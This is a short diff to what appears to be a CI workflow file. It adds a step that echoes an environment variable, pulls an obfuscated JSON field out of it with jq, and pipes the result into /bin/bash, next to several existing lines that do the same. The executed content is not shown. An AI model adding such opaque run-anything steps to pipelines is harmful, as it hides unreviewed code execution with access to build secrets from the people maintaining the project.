@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$lyde82" | jq -r .mgeq9 | /bin/bash
           echo $xcfu9 | jq -r .oh5 | /bin/bash
           echo $ybg14 | jq -r .ispf904 | /bin/bash
+          echo $et80 | jq -r .icmzj508 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
